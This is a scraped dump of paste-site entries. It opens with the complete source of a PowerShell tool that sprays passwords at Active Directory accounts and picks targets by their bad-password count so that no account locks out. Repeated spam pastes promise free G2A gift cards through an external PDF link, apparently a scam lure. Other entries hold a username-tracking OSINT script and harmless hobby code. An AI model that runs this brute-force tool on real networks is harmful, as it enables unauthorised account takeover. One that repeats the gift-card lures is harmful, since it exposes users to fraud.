id,title,username,language,date,content
a26CdhZe,Untitled,Lebarra,PowerShell,Sunday 2nd of June 2024 05:19:46 PM CDT,"function Invoke-SMBAutoBrute
{
<#
.SYNOPSIS

    Performs smart brute forcing of accounts against the current domain, ensuring that
	lockouts do not occur.

    Author: Jason Lang (@curi0usJack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0

.DESCRIPTION

    This script takes either a list of users or, if not specified, will query the domain 
	for a list of users on every brute attempt. The users queried will have a badPwdCount 
	attribute of two less than the LockoutThreshold to ensure they are not locked in the brute
	attempt, with a new list being queried for every attempt. Designed to simply input the 
	LockoutThreshold as well as a password list and then run. Note that each DC is queried
	for bad password count for each user for each brute, so this script is noisy.

.EXAMPLE

    PS C:\> Invoke-SMBAutoBrute -PasswordList ""jennifer, yankees"" -LockoutThreshold 3

	[*] Performing prereq checks.
	[*] PDC: LAB-2008-DC1.lab.com
	[*] Passwords to test: jennifer, yankees, 123456
	[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...
	[+] Success! Username: TestUser6. Password: jennifer
	[+] Success! Username: TestUser99. Password: yankees
	[*] Completed.

.PARAMETER UserList

	A text file of userids (one per line) to brute. Do not append DOMAIN\ in front of the userid.
	If this parameter is not specified, the script will retrieve a new list of user accounts for
	each attempt to ensure accounts are not locked.
	
.PARAMETER PasswordList

	A comma separated list of passwords to attempt. 
	
.PARAMETER LockoutThreshold

	The domain setting that specifies the number of bad login attempts before the account locks.
	To discover this, open a command prompt from a domain joined machine and run ""net accounts"".
	
.PARAMETER Delay

	The delay time (in milliseconds) between each brute attempt. Default 100.
	
.PARAMETER ShowVerbose

	Will display Failed as well as Skipped attempts. Generates a ton of data.
	
.PARAMETER StopOnSuccess

	The script will exit after the first successful authentication.

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $UserList,

        [parameter(Mandatory = $True)]
        [String] $PasswordList,

        [parameter(Mandatory = $True)]
        [String] $LockoutThreshold,

        [parameter(Mandatory = $False)]
        [int] $Delay,

        [parameter(Mandatory = $False)]
        [Switch] $ShowVerbose,

        [parameter(Mandatory = $False)]
        [Switch] $StopOnSuccess
    )

    Begin
    {
        Set-StrictMode -Version 2

        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        Try {Add-Type -AssemblyName System.DirectoryServices}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        function Get-PDCe()
        {
            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext(""Domain"",""lab.com"")
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
            return $domain.pdcRoleOwner
        }

        function Get-UserList($maxbadpwdcount)
        {
            $users = New-Object System.Collections.ArrayList
            $counttouse = $maxbadpwdcount - 2 # We have to use <= in our LDAP query. Use - 2 attempts to ensure the accounts are not locked with this attempt.
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))"" #UAC = enabled accounts only
            $search.PageSize = 10
            $foundusers = $search.FindAll()
            if ($foundusers -ne $null)
            {
                foreach ($u in $foundusers)
                {
                    $users.Add([string]$u.Properties['samaccountname']) | Out-Null
                }
            }
            return $users
        }

        function Get-DomainControllers
        {
            $dcs = New-Object System.Collections.ArrayList
            $filter = ""(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))""
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = $filter
            $search.PropertiesToLoad.Add('CN') | Out-Null
            $results = $search.FindAll()
            foreach ($item in $results)
            {
                $dcs.Add($item.Properties['cn']) | Out-Null
            }
            $search = $null
            $de.Dispose()
            return $dcs
        }

        function Get-DCBadPwdCount($userid, $dc)
        {
            $count = -1
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$dc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(samaccountname=$userid))""
            $search.PropertiestoLoad.Add('badPwdCount') | Out-Null
            $user = $search.FindOne()
            if ($user -ne $null)
            {
                $count = $user.Properties['badpwdcount']
            }
            $search = $null
            $de.Dispose()
            return $count
        }

        function Get-UserBadPwdCount($userid, $dcs)
        {
            # The badPwdCount attribute is not replicated. Attempts should be reported back to the PDC,
            # but here get the greatest count from amongst all the DCs to guard against replication errors.
            $totalbadcount = -1
            foreach ($dc in $dcs)
            {
                $badcount = Get-DCBadPwdCount $userid $dc
                if ($badcount -gt $totalbadcount)
                {
                    $totalbadcount = $badcount
                }
            }
            return $totalbadcount
        }
    }

    Process
    {
        $validaccounts = @{}

        $userstotest = $null
        Write-Host ""`n[*] Performing prereq checks.""
        if ([String]::IsNullOrEmpty($UserList) -eq $false)
        {
            if ([System.IO.File]::Exists($UserList) -eq $false)
            {
                ""[!] $UserList not found. Aborting.`n""
                exit
            }
            else
            {
                $userstotest = Get-Content $UserList
            }
        }

        $pdc = Get-PDCe

        if ($pdc -eq $null)
        {
            Write-Host ""[!] Could not locate domain controller. Aborting.""
            exit
        }

        Write-Host ""[*] PDC: $pdc""
        Write-Host ""[*] Passwords to test: $PasswordList""

        $dcs = Get-DomainControllers
        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)

        $pwds = New-Object System.Collections.ArrayList
        foreach ($pwd in $PasswordList.Split(','))
        {
            $pwds.Add($pwd.Trim(' ')) | Out-Null
        }

        Write-Host ""[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...""
        foreach ($p in $pwds)
        {
            if ($userstotest -eq $null)
            {
                $userstotest = Get-UserList $LockoutThreshold
            }

            foreach ($u in $userstotest)
            {
                $userid = $u.Trim(' ').Trim([Environment]::Newline)
                if ($validaccounts.ContainsKey($userid) -eq $false)
                {
                    $attempts = Get-UserBadPwdCount $userid $dcs
                    
                    #Be sure to use 2 less than the LockoutThresold so the account will not be locked out as a result of the next test.
                    if ($attempts -ne -1 -and $attempts -le ($LockoutThreshold - 2)) 
                    {
                        $IsValid = $false
                        $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()

                        if ($IsValid -eq $True)
                        {
                            Write-Host ""[+] Success! Username: $userid. Password: $p""
                            $validaccounts.Add($userid, $p)
                            if ($StopOnSuccess.IsPresent)
                            {
				Write-Host ""[*] StopOnSuccess. Exiting.`n""
                                exit
                            }
                        }
                        else
                        {
                            if ($ShowVerbose.IsPresent)
                            {
                                Write-Host ""[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)""
                            }
                        }

                        if ($Delay)
                        {
                            Start-Sleep -m $Delay
                        }
                        else
                        {
                            Start-Sleep -m 100
                        }
                    }
                    else
                    {
                        if ($ShowVerbose.IsPresent)
                        {
                            Write-Host ""[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts""
                        }
                    }
                }
            }
        }
        Write-Host ""[*] Completed.`n""
    }
}
"
52gq5HX7,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,vivek599,JavaScript,Sunday 2nd of June 2024 05:03:17 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
D03phCiW,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,ColtM4A2,JavaScript,Sunday 2nd of June 2024 04:38:16 PM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
DmmzqWhY,Untitled,Mysoft,FreeBasic,Sunday 2nd of June 2024 04:37:35 PM CDT,"#include ""MyTDT\fbplay2.bas""

play ""P64""

dim as double TMR = timer
play ""L4CC""
print timer-TMR

TMR = timer
play ""L6CCC""
print timer-TMR

TMR = timer
play ""L8CCCC""
print timer-TMR

TMR = timer
play ""L16CCCCCCCC""
print timer-TMR

TMR = timer
play ""L32CCCCCCCCCCCCCCCC""
print timer-TMR

TMR = timer
play ""L64CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC""
print timer-TMR
"
MPaH3vLy,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Skarface-MKL,JavaScript,Sunday 2nd of June 2024 04:13:13 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
QDCK2xx0,Untitled,hiippiie,Python,Sunday 2nd of June 2024 03:50:40 PM CDT,"import asyncio
import logging
import sys

import maigret
from maigret.result import QueryStatus

logging.getLogger('asyncio').setLevel(logging.WARNING)


MAIGRET_DB_FILE = 'https://raw.githubusercontent.com/soxoj/maigret/main/maigret/resources/data.json'
TOP_SITES_COUNT = 1500 
TIMEOUT = 5 


def setup_logger(log_level, name):
    for lib in ['requests', 'urllib3']:
        logging.getLogger(lib).setLevel(logging.WARNING) # change to debug
    logger = logging.getLogger(name)
    logger.setLevel(log_level)
    return logger


async def maigret_search(username):
    logger = setup_logger(logging.WARNING, 'maigret')
    db = maigret.MaigretDatabase().load_from_path(MAIGRET_DB_FILE)
    sites = db.ranked_sites_dict(top=TOP_SITES_COUNT)

    results = await maigret.search(username=username,
                                   site_dict=sites,
                                   timeout=TIMEOUT,
                                   max_connections=5, # max concurrent connection - default is 100
                                   is_parsing_enabled=True,
                                   logger=logger,
                                   no_progressbar=True, # change to debug
                                   query_notify=None, # change to debug
                                   )
    return results


def get_maigret_data(username):
    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(maigret_search(username))

    res = {}
    for site, data in results.items():
        if data['status'].status != QueryStatus.CLAIMED:
            continue

        res[site] = data

    return res


if __name__ == '__main__':
    print(get_maigret_data('TESTUSERNAME'))
"
a8hp3yie,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,thepplayz,JavaScript,Sunday 2nd of June 2024 03:48:10 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
y4L6Vz5b,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sirmikey,JavaScript,Sunday 2nd of June 2024 03:23:09 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
nmdTiDbX,Unnamed Main Screen,E-Kemp,Lua,Sunday 2nd of June 2024 03:23:04 PM CDT,"modem = peripheral.wrap(""left"")
chat = peripheral.wrap(""chat_box_0"")
radar = peripheral.wrap(""radar_0"")
driveLoc = disk.getMountPath(""drive_0"")
monitor = peripheral.wrap(""top"")

players = {}

-- Render Function
function render()
  term.clear()
  term.setCursorPos(1, 1)
  print(""Welcome to >>"")
  write(""              Elli"")
  term.setTextColor(colors.purple)
  print(""OS"")
  term.setTextColor(colors.white)
  print(""\n--------------\n"")
  print(""Players present:"")
  if next(players) ~= nil then
    local day = os.day()
    for k, v in pairs(players) do
      print(""   > ""..v.name)
    end
  else
    print(""    None"")
  end
  print(""\n--------------\n"")
end

function monitor_render()
  local x, y = monitor.getSize()

  monitor.clear()
  monitor.setTextScale(0.5)
  monitor.setCursorPos(1, 1)
  monitor.write("">> Elli"")
  monitor.setTextColor(colors.purple)
  monitor.write(""OS"")
  monitor.setTextColor(colors.white)
  for i = 1, x do
    monitor.setCursorPos(i, 2)
    monitor.write(""-"")
  end
  monitor.setCursorPos(1, 4)
  monitor.write(""Players:"")
  for i, v in pairs(players) do
    monitor.setCursorPos(1, i+4)
    monitor.write(i.."": ""..v.name)
  end
end

while true do
  players = radar.getPlayers()
  monitor_render()
  render()
  os.sleep(1)
end


-- Listen for events
"
3EFptMxp,Набор текста голосом,egor230,Python,Sunday 2nd of June 2024 03:22:21 PM CDT,"'''Данный скрипт предназначен для распознавания речи с использованием микрофона, автоматической замены произнесенных слов на заранее заданные и последующей печати текста с помощью симулированной клавиатуры. Он также включает функции по управлению вводом с микрофона и настройкой эквалайзера для улучшения качества звука.
'''
import json, os, re, subprocess, time, threading, sys, audioop
import speech_recognition as sr
from pywinauto import keyboard
from pynput.keyboard import Key, Controller
from pynput import *
class save_key:
  def __init__(self):
    self.text = """"
    self.flag = False
    self.word=[]
    self.res={}
    self.new_res={}
  def save_text(self, text):
    self.text = text
  def get_text(self):
    return self.text
  def get_flag(self):
    return self.flag

  def set_flag(self, value):
    self.flag = value

  def update_dict(self):
   data = ""/mnt/807EB5FA7EB5E954/софт/виртуальная машина/linux must have/python_linux/Project/list for replacements.json""  # файл настроек.
   if os.path.exists(data):  # есть ли этот файл.
    with open(data, encoding=""cp1251"") as json_file:  # загрузка настроек из файла.
     self.res = json.load(json_file)     # проходимся по каждому элементу словаря
     for key in self.res.keys():    # Если ключ содержит '*', добавляем его в новый словарь
      if '*' in key:
       self.new_res[key] = self.res[key]
     for key in self.new_res.keys():
      del self.res[key]

  def get_dict(self):# словарь без *
     return self.res

  def get_new_dict(self):# словарь с *
     return self.new_res

  def save_words(self, w):
     self.word.clear()
     for i in w:
      self.word.append(i)

  def get_words(self):
     return self.word
k=save_key()
k.update_dict()
def replace(match):
  res=k.get_dict()
  return res[match.group(0)]
class save_ln:
  def __init__(self):
    self.text = """"
  def save_text(self, text):
    self.text = text
  def get_text(self):
      return self.text
def typing_text(char1):#  delay = 0.0001  # Задайте здесь нужную задержку в секундах
  for char in char1:
    script = f'''#!/bin/bash
    word=""{char}""  # Задайте здесь нужное слово  # Задайте здесь нужную задержку в секундах
    if [[ -z ""$word"" ]]; then
      xte ""key space""
    else
    xdotool type  ""$word""
    fi
    '''
    subprocess.call(['bash', '-c', script, '_'])

def repeat(text, k):
  k.save_text(text)
  text1=""""
  res=k.get_dict()
  k.save_words(res)
  words=k.get_words()
  for i in words:
     text = k.get_text()
     reg = r'\b' + r'\b|\b'.join([i]) + r'\b'
     text1 = re.sub(reg, replace, text)
     k.save_text(text1)
  new_res= k.get_new_dict()
  for word, i in new_res.items():
      text = k.get_text()
      pattern = re.compile(re.escape(word), re.IGNORECASE)
      text1 = pattern.sub(i, text)
      k.save_text(text1)
  return text1

# Подавление вывода ошибок
class NoALSAErrorOutput:
  def __enter__(self):
    self._stderr = sys.stderr
    sys.stderr = open(os.devnull, 'w')

  def __exit__(self, exc_type, exc_val, exc_tb):
    sys.stderr.close()
    sys.stderr = self._stderr


with NoALSAErrorOutput():
  mic = sr.Microphone()

# Создаем экземпляр класса распознавания
r = sr.Recognizer()

# Настройки микрофона
mic = sr.Microphone()

# Начальная настройка микрофона для снижения уровня шума
with mic as source:
  r.adjust_for_ambient_noise(source)
def on_press(key):  # обработчик клави. # print(key )
 key=str(key).replace("" "","""")
 if key == ""Key.shift_r"":
   # print(""okl"")
   k.set_flag(True)
   return True
 if key == ""Key.space"":
   k.set_flag(False)
   return True
 else:
  return True
def on_release(key):
 pass
 return True
def a():
  while 1:
    with keyboard.Listener(on_release=on_release, on_press=on_press) as listener:
      listener.join()

def apply_pulseaudio_equalizer():
  # Применение эквалайзера с использованием PulseAudio
  subprocess.run(['pactl', 'load-module', 'module-equalizer-sink', 'sink_name=equalizer'])
  subprocess.run(
    ['pactl', 'load-module', 'module-ladspa-sink', 'sink_name=ladspa_equalizer', 'sink_properties=device.description=Equalized_Sink', 'master=equalizer', 'plugin=mbeq_1197',
     'label=mbeq', 'control=6.0,6.0,4.5,0.0,0.0,0.0,0.0,0.0,4.5,7.0,8.5,10.0,12.0,8.5,6.0'])


# Подавление вывода ошибок ALSA
class NoALSAErrorOutput:
    def __enter__(self):
        self._stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stderr.close()
        sys.stderr = self._stderr

def get_mic_sources_pa():# Получение списка источников ввода
    result = subprocess.run(['pactl', 'list', 'sources', 'short'], stdout=subprocess.PIPE)
    return result.stdout.decode()

def set_mic_volume_pa(source_name, volume_percentage):# Установить уровень громкости микрофона через PulseAudio
    subprocess.run(['pactl', 'set-source-volume', source_name, f'{volume_percentage}%'])

mic_sources = get_mic_sources_pa()# Получение информации о устройствах ввода с помощью PulseAudio
# Переключитесь для вашего источника
source_name = ""alsa_input.usb-046d_HD_Webcam_C525_79588C20-00.mono-fallback""
volume_level = 50  # Процент громкости
set_mic_volume_pa(source_name, volume_level)# Установка уровня громкости микрофона

def recognize_speech():
  with mic as source:
    while 1:
      try:
        print(""Скажите что-нибудь..."")
        audio = r.listen(source)          # Обработка аудио данных или передача в распознаватель речи
        text = r.recognize_google(audio, language=""ru-RU"")# Распознаем услышанное при помощи Google Web Speech API
        text = str(text.lower()) + str("" "")
        print(text)
        if k.get_flag() == True:
          k.set_flag(False)
          text0 = text[0].upper() + text[1:]
          typing_text(text0)  #(text0)
        else:
          typing_text(text)  #(text)
      except sr.UnknownValueError:
        print(""Google Web Speech API не смог распознать аудио"")
      except sr.RequestError as e:
        print(f""Could not request results from Google Web Speech API; {e}"")

# Запуск потока для непрерывного прослушивания
apply_pulseaudio_equalizer()
listening_thread = threading.Thread(target=recognize_speech)
listening_thread.start()
t1 = threading.Thread(target=a)
t1.start()
while True:
  pass
"
